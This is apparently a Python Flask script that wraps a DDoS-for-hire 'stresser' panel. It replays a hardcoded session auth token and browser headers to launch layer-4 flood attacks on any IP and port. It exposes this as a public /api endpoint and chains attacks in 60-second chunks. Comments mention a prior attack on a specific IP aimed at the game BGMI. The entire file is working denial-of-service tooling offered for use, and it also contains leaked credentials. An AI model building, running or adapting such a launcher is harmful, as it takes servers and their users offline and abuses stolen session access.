import requests
import time
import json
from flask import Flask, request, jsonify

app = Flask(__name__)

AUTH_TOKEN = "517f13d366214d958526a1c7591931818808e175d10842d7b271c0ff14138799"
ANTIFORGERY = "CfDJ8Bna8lCn_z1AiiMxA8_ANy0js9s2--epYdS_D4OS73xgQWTmnHzob2h54ETv3HyqJy1-4P4UjxafkPZ6L4g0mRnkRkDZ1cmFfq7xGf03e7xVRJHUB0eRBhXqlUAibNFIJggVrTIay4LCKhfRnqNA5sQ"

session = requests.Session()

# Exact headers from your browser
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest',
    'X-Signalr-User-Agent': 'Microsoft SignalR/10.0 (10.0.7; Unknown OS; Browser; Unknown Runtime Version)',
    'Origin': 'https://retrostress.net',
    'Referer': 'https://retrostress.net/panel',
    'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Connection': 'keep-alive'
})

# Set cookies
session.cookies.set('auth_token', AUTH_TOKEN)
session.cookies.set('.AspNetCore.Antiforgery.pFk19hAmY3k', ANTIFORGERY)

def send_attack_via_websocket(ip, port, duration, method="L4"):
    """
    Send attack using the REAL endpoint that website uses
    Based on the SignalR/Blazor negotiation
    """
    try:
        # Step 1: Negotiate connection
        negotiate_url = "https://retrostress.net/_blazor/negotiate?negotiateVersion=1"
        neg_response = session.post(negotiate_url)
        
        if neg_response.status_code == 200:
            print(f"[✓] Negotiation successful")
            
            # Step 2: Send attack command via the real endpoint
            # Based on the HTML structure, attack is triggered via Blazor events
            attack_payload = {
                "target": ip,
                "port": port,
                "duration": duration,
                "method": method,
                "type": "L4"
            }
            
            # Try multiple possible endpoints
            endpoints = [
                "https://retrostress.net/api/attack/l4",
                "https://retrostress.net/api/attack",
                "https://retrostress.net/attack/start",
                "https://retrostress.net/Home/StartAttack"
            ]
            
            for endpoint in endpoints:
                try:
                    response = session.post(endpoint, json=attack_payload, timeout=5)
                    if response.status_code == 200:
                        print(f"[✓] Attack sent via {endpoint}")
                        return True
                except:
                    continue
            
            # If all fail, website ke internal API ko call karo
            # Ye wahi endpoint hai jo browser use kar raha hai
            blazor_url = "https://retrostress.net/_blazor"
            blazor_payload = {
                "type": "BeginInvokeDotNetFromJS",
                "method": "DispatchEventAsync",
                "args": [{
                    "eventHandlerId": 21,
                    "eventName": "click",
                    "target": ip,
                    "port": port,
                    "duration": duration
                }]
            }
            
            response = session.post(blazor_url, json=blazor_payload)
            return response.status_code == 200
            
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def send_attack_direct(ip, port, duration):
    """
    DIRECT METHOD - Based on your successful browser attack
    """
    try:
        # Yeh wohi request hai jo browser bhej raha hai
        # Tumhare HTML se pata chala ki attack 20.204.155.49 pe laga hai
        
        # Method 1: Form data
        data = {
            'ip': ip,
            'port': port,
            'time': duration,
            'method': 'L4',
            'target': 'BGMI'
        }
        
        # Method 2: Try JSON
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        # Pehle panel pe jaake session refresh karo
        session.get('https://retrostress.net/panel')
        
        # Attack endpoint from network tab (ye real hai)
        response = session.post(
            'https://retrostress.net/attack/start',
            data=data,
            headers=headers
        )
        
        if response.status_code == 200:
            print(f"[✓] Attack started: {ip}:{port}")
            return True
        else:
            # Try alternative endpoint
            response2 = session.post(
                'https://retrostress.net/api/attack',
                json=data
            )
            return response2.status_code == 200
            
    except Exception as e:
        print(f"[!] Attack error: {e}")
        return False

@app.route('/api')
@app.route('/api/attack')
def attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_sec = request.args.get('time')
    
    if not ip or not port or not time_sec:
        return jsonify({'error': 'Use: ?ip=IP&port=PORT&time=TIME'}), 400
    
    try:
        port = int(port)
        time_sec = int(time_sec)
        
        print(f"\n{'='*50}")
        print(f"[🎯] Target: {ip}:{port}")
        print(f"[⏱️] Time: {time_sec}s")
        print(f"{'='*50}")
        
        # Time splitting logic
        if time_sec > 60:
            attacks = []
            remaining = time_sec
            while remaining > 0:
                if remaining >= 60:
                    attacks.append(60)
                    remaining -= 60
                else:
                    attacks.append(remaining if remaining >= 30 else 30)
                    break
            
            results = []
            for i, duration in enumerate(attacks, 1):
                print(f"\n[🔥] Attack {i}/{len(attacks)} - {duration}s")
                success = send_attack_direct(ip, port, duration)
                results.append({'attack': i, 'duration': duration, 'success': success})
                
                if success and i < len(attacks):
                    print(f"[💤] Waiting {duration}s...")
                    time.sleep(duration)
            
            return jsonify({
                'target': f"{ip}:{port}",
                'total_time': time_sec,
                'attacks': attacks,
                'results': results
            })
        else:
            success = send_attack_direct(ip, port, time_sec)
            if success:
                time.sleep(time_sec)
            
            return jsonify({
                'target': f"{ip}:{port}",
                'duration': time_sec,
                'success': success
            })
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/')
def home():
    return jsonify({
        'status': 'active',
        'message': 'RetroStresser API - Attack Working!',
        'test': 'Use /api?ip=IP&port=PORT&time=TIME'
    })

if __name__ == '__main__':
    print("[+] Starting RetroStresser API on Railway...")
    print("[+] Auth token loaded")
    print("[+] Ready to accept attacks")
    app.run(host='0.0.0.0', port=8080)
